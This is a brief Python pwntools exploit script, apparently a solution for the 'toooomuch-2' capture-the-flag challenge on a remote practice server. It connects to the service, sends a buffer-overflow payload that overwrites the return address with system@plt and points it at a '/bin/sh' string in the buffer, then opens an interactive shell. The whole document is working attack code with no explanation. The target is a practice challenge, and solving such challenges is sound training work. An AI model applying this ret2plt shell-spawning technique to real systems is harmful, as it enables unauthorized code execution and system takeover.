from pwn import *

#p = process('./toooomuch-2')
p = remote('hackme.inndy.tw',7702)
p.recvuntil('passcode: ')
system_plt = 0x080484c0
payload = '/bin/sh\x00' + 'a'*0x10 + 'aaaa'
payload += p32(system_plt) + p32(0x080487D9) + p32(0x08049C60)
#gdb.attach(p)
p.sendline(payload)

p.interactive()